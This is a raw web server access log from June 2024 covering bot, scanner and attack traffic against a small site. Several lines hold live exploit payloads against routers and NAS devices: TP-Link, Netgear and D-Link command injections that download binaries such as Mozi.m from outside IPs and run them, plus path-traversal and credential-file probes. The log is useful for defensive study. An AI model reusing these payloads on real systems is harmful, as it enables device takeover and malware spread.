147.185.133.231 - - [16/Jun/2024:03:11:50 +0000] "GET / HTTP/1.1" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
149.50.103.48 - - [16/Jun/2024:03:21:47 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
171.124.105.139 - - [16/Jun/2024:03:33:05 +0000] "GET /mmst.v.smtcdns.net/zycfcdn.gdwlcloud.com/PLTV/88888888/224/3221225490/index.m3u8 HTTP/1.1" 301 166 "-" "okhttp/3.15"
112.95.227.2 - - [16/Jun/2024:03:37:50 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 154 "-" "-"
112.95.227.2 - - [16/Jun/2024:03:38:04 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 154 "-" "-"
209.38.22.197 - - [16/Jun/2024:03:41:51 +0000] "GET /.git/config HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
149.50.103.48 - - [16/Jun/2024:03:42:47 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [16/Jun/2024:03:49:48 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
65.49.1.46 - - [16/Jun/2024:03:49:56 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x02^-\xFCZ\xB6\x0B\x95\x1D\x00\x0EV|\xE9\x9C\xA4\xAD\xB7\xD7yA\xF6\x10\xA1\x1A3=c\xCF\xBC\xA4\xB1\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
149.50.103.48 - - [16/Jun/2024:03:56:33 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [16/Jun/2024:05:33:59 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
178.248.200.13 - - [16/Jun/2024:05:49:16 +0000] "GET /wp-content/plugins/formidable/js/plugin-search.js HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
149.50.103.48 - - [16/Jun/2024:05:54:08 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
206.189.20.41 - - [16/Jun/2024:06:01:04 +0000] "\x16\x03\x01\x01\xFE\x01\x00\x01\xFA\x03\x03\x81\xF7\xBC\xC3\x83\xE9ee(9a\xB7\xAC\xF5T\xB8\xCC\xBCP\xBC\xD64\xAF\xBDT\x18\xEA\x8C\x0C\x87J\x07\x00\x01<\xCC\x14\xCC\x13\xCC\x15\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 154 "-" "-"
45.148.10.59 - - [16/Jun/2024:06:01:42 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
149.50.103.48 - - [16/Jun/2024:06:13:21 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
18.116.120.100 - - [16/Jun/2024:06:22:43 +0000] "GET http://httpbin.org/ip HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
18.116.120.100 - - [16/Jun/2024:06:22:44 +0000] "CONNECT hanisntsolo.github.io:443 HTTP/1.1" 400 154 "-" "-"
144.126.193.120 - - [16/Jun/2024:06:24:29 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
185.253.160.142 - - [16/Jun/2024:06:31:40 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/90.0"
149.50.103.48 - - [16/Jun/2024:06:39:19 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.237 - - [16/Jun/2024:06:43:22 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
104.152.52.87 - - [16/Jun/2024:06:44:14 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
185.191.127.212 - - [16/Jun/2024:06:50:56 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
88.173.222.130 - - [16/Jun/2024:06:56:41 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
149.50.103.48 - - [16/Jun/2024:06:57:40 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [16/Jun/2024:07:21:05 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
193.32.162.96 - - [16/Jun/2024:07:26:45 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.32.162.96 - - [16/Jun/2024:07:26:45 +0000] "POST / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
43.134.190.89 - - [16/Jun/2024:07:27:49 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
84.54.51.147 - - [16/Jun/2024:07:28:57 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
59.89.70.192 - - [16/Jun/2024:07:33:30 +0000] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 301 166 "-" "-"
149.50.103.48 - - [16/Jun/2024:07:35:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.148.10.174 - - [16/Jun/2024:07:35:58 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.148.10.78%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
185.191.127.212 - - [16/Jun/2024:07:55:56 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [16/Jun/2024:08:17:06 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
84.54.51.147 - - [16/Jun/2024:08:23:33 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
84.54.51.147 - - [16/Jun/2024:08:23:34 +0000] "" 400 0 "-" "-"
45.128.232.196 - - [16/Jun/2024:08:26:11 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.128.232.196 - - [16/Jun/2024:08:26:11 +0000] "" 400 0 "-" "-"
149.50.103.48 - - [16/Jun/2024:08:34:24 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.128.232.196 - - [16/Jun/2024:08:40:32 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.128.232.196 - - [16/Jun/2024:08:40:32 +0000] "" 400 0 "-" "-"
185.224.128.74 - - [16/Jun/2024:08:41:37 +0000] "CONNECT www.bing.com:443 HTTP/1.1" 400 154 "-" "-"
84.54.51.147 - - [16/Jun/2024:08:42:28 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
84.54.51.147 - - [16/Jun/2024:08:42:29 +0000] "" 400 0 "-" "-"
45.128.232.196 - - [16/Jun/2024:08:51:00 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.128.232.196 - - [16/Jun/2024:08:51:00 +0000] "p" 400 154 "-" "-"
149.50.103.48 - - [16/Jun/2024:08:56:12 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
84.54.51.147 - - [16/Jun/2024:08:56:18 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
2.58.95.137 - - [16/Jun/2024:08:57:24 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
2.58.95.137 - - [16/Jun/2024:08:57:25 +0000] "" 400 0 "-" "-"
185.216.70.252 - - [16/Jun/2024:09:06:11 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.216.70.252 - - [16/Jun/2024:09:06:11 +0000] "POST / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.216.70.252 - - [16/Jun/2024:09:06:12 +0000] "GET /sendgrid/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.216.70.252 - - [16/Jun/2024:09:06:13 +0000] "POST / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.191.127.212 - - [16/Jun/2024:09:06:25 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
162.142.125.198 - - [16/Jun/2024:09:07:57 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
162.142.125.198 - - [16/Jun/2024:09:08:06 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.198 - - [16/Jun/2024:09:08:08 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
45.128.232.196 - - [16/Jun/2024:09:11:11 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.128.232.196 - - [16/Jun/2024:09:11:11 +0000] "" 400 0 "-" "-"
121.229.185.160 - - [16/Jun/2024:09:11:53 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
84.54.51.147 - - [16/Jun/2024:09:16:26 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
84.54.51.147 - - [16/Jun/2024:09:16:27 +0000] "" 400 0 "-" "-"
149.50.103.48 - - [16/Jun/2024:09:20:58 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
109.205.213.198 - - [16/Jun/2024:09:26:42 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
2.58.95.137 - - [16/Jun/2024:09:29:10 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
2.58.95.137 - - [16/Jun/2024:09:29:12 +0000] "" 400 0 "-" "-"
84.54.51.147 - - [16/Jun/2024:09:29:42 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
84.54.51.147 - - [16/Jun/2024:09:29:43 +0000] "" 400 0 "-" "-"
109.205.213.198 - - [16/Jun/2024:09:30:58 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World"
84.54.51.147 - - [16/Jun/2024:10:03:49 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
84.54.51.147 - - [16/Jun/2024:10:03:49 +0000] "" 400 0 "-" "-"
84.54.51.147 - - [16/Jun/2024:10:12:24 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
84.54.51.147 - - [16/Jun/2024:10:12:24 +0000] "" 400 0 "-" "-"
149.50.103.48 - - [16/Jun/2024:10:13:33 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [16/Jun/2024:10:19:16 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
185.191.127.212 - - [16/Jun/2024:10:22:48 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
45.128.232.196 - - [16/Jun/2024:10:23:04 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.128.232.196 - - [16/Jun/2024:10:23:04 +0000] "" 400 0 "-" "-"
149.50.103.48 - - [16/Jun/2024:10:36:16 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
64.62.156.47 - - [16/Jun/2024:10:48:16 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
64.62.156.42 - - [16/Jun/2024:10:49:23 +0000] "GET /webui/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0.0; Win64; x64; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.63 Chrome/124.0.6367.63 Not-A.Brand/99  Safari/537.36"
64.62.156.50 - - [16/Jun/2024:10:49:46 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0.0; Win64; x64; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.63 Chrome/124.0.6367.63 Not-A.Brand/99  Safari/537.36"
84.54.51.147 - - [16/Jun/2024:10:50:37 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
84.54.51.147 - - [16/Jun/2024:10:50:38 +0000] "" 400 0 "-" "-"
64.62.156.45 - - [16/Jun/2024:10:50:46 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
64.62.156.43 - - [16/Jun/2024:10:51:36 +0000] "GET /geoserver/web/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
149.50.103.48 - - [16/Jun/2024:11:01:14 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
46.17.174.172 - - [16/Jun/2024:11:09:43 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0"
45.128.232.196 - - [16/Jun/2024:11:18:07 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.128.232.196 - - [16/Jun/2024:11:18:07 +0000] "" 400 0 "-" "-"
149.50.103.48 - - [16/Jun/2024:11:21:45 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.11.79 - - [16/Jun/2024:11:30:19 +0000] "CONNECT google.com:443 HTTP/1.1" 400 154 "-" "-"
185.191.127.212 - - [16/Jun/2024:11:40:03 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [16/Jun/2024:11:40:28 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
104.152.52.78 - - [16/Jun/2024:11:51:06 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
149.50.103.48 - - [16/Jun/2024:11:57:36 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.156.128.49 - - [16/Jun/2024:14:12:18 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.156.128.49 - - [16/Jun/2024:14:12:19 +0000] "GET /wp-content/plugins/elementor/readme.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
149.50.103.48 - - [16/Jun/2024:14:19:49 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [16/Jun/2024:14:20:49 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [16/Jun/2024:14:34:26 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
109.205.213.198 - - [16/Jun/2024:14:39:41 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
185.224.128.43 - - [16/Jun/2024:14:40:03 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
128.90.170.5 - - [16/Jun/2024:14:49:52 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"
109.205.213.198 - - [16/Jun/2024:14:50:55 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World"
178.128.84.112 - - [16/Jun/2024:14:56:09 +0000] "GET /Temporary_Listen_Addresses HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
178.128.84.112 - - [16/Jun/2024:14:56:10 +0000] "GET /Pages/log/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
149.50.103.48 - - [16/Jun/2024:14:59:13 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [16/Jun/2024:15:01:11 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
85.209.11.117 - - [16/Jun/2024:15:10:13 +0000] "GET / HTTP/1.0" 301 166 "http://hanisntsolo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
149.50.103.48 - - [16/Jun/2024:15:16:39 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.148.10.174 - - [16/Jun/2024:15:26:10 +0000] "GET /cgi-bin/nas_sharing.cgi?cmd=15&passwd=&system=ZWNobwktZQkiXHg2M1x4NjRceDIwXHgyZlx4NzRceDZkXHg3MFx4M2JceDIwXHg3Mlx4NmRceDIwXHgyZFx4NzJceDY2XHgyMFx4NzNceDY4XHg2Ylx4M2JceDIwXHg3N1x4NjdceDY1XHg3NFx4MjBceDY4XHg3NFx4NzRceDcwXHgzYVx4MmZceDJmXHgzNFx4MzVceDJlXHgzMVx4MzRceDM4XHgyZVx4MzFceDMwXHgyZVx4MzdceDM4XHgyZlx4NzNceDY4XHg2Ylx4MjBceDdjXHg3Y1x4MjBceDYzXHg3NVx4NzJceDZjXHgyMFx4MmRceDRmXHgyMFx4NjhceDc0XHg3NFx4NzBceDNhXHgyZlx4MmZceDM0XHgzNVx4MmVceDMxXHgzNFx4MzhceDJlXHgzMVx4MzBceDJlXHgzN1x4MzhceDJmXHg3M1x4NjhceDZiXHgyMFx4N2NceDdjXHgyMFx4NzRceDY2XHg3NFx4NzBceDIwXHgyZFx4NjdceDIwXHgyZFx4NzJceDIwXHg3M1x4NjhceDZiXHgyMFx4MzRceDM1XHgyZVx4MzFceDM0XHgzOFx4MmVceDMxXHgzMFx4MmVceDM3XHgzOFx4M2JceDIwXHg2M1x4NjhceDZkXHg2Zlx4NjRceDIwXHgyYlx4NzhceDIwXHg3M1x4NjhceDZiXHgzYlx4MjBceDJlXHgyZlx4NzNceDY4XHg2Ylx4MjBceDY0XHg2Y1x4NjlceDZlXHg2Ylx4M2JceDIwXHg3Mlx4NmRceDIwXHgyZFx4NzJceDY2XHgyMFx4NzNceDY4XHg2Ylx4M2IifHNo&user=messagebus HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [16/Jun/2024:15:32:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
206.168.34.45 - - [16/Jun/2024:15:33:44 +0000] "GET // HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.45 - - [16/Jun/2024:15:33:45 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
104.152.52.26 - - [16/Jun/2024:15:54:27 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
149.50.103.48 - - [16/Jun/2024:15:54:28 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
59.184.240.202 - - [16/Jun/2024:15:55:20 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.184.240.202:35866/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 166 "-" "-"
51.178.211.196 - - [16/Jun/2024:17:16:59 +0000] "GET /wp-login.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Gentoo; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
149.50.103.48 - - [16/Jun/2024:17:17:30 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [16/Jun/2024:17:23:34 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [16/Jun/2024:17:34:38 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
109.205.213.198 - - [16/Jun/2024:17:34:58 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
109.205.213.198 - - [16/Jun/2024:17:43:05 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World"
104.152.52.31 - - [16/Jun/2024:17:48:11 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
162.214.191.42 - - [16/Jun/2024:17:55:12 +0000] "GET /wp-login.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
149.50.103.48 - - [16/Jun/2024:18:01:53 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.148.10.174 - - [16/Jun/2024:18:05:14 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.148.10.78%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
185.244.36.221 - - [16/Jun/2024:18:09:58 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+tplink%3B+wget+http%3A%2F%2F185.244.36.221%2Ftplink%3B+chmod+777+tplink%3B+.%2Ftplink+tplink%3B+rm+-rf+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
205.210.31.128 - - [16/Jun/2024:18:14:00 +0000] "GET / HTTP/1.1" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
149.50.103.48 - - [16/Jun/2024:18:18:27 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [17/Jun/2024:04:40:21 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.224.128.43 - - [17/Jun/2024:04:45:50 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
84.54.51.37 - - [17/Jun/2024:05:01:53 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F94.156.71.83%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [17/Jun/2024:05:02:53 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [17/Jun/2024:05:18:50 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
147.185.132.165 - - [17/Jun/2024:05:22:12 +0000] "GET / HTTP/1.0" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
216.250.255.126 - - [17/Jun/2024:05:29:57 +0000] "HEAD / HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 5.2; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7"
216.250.255.126 - - [17/Jun/2024:05:29:58 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13"
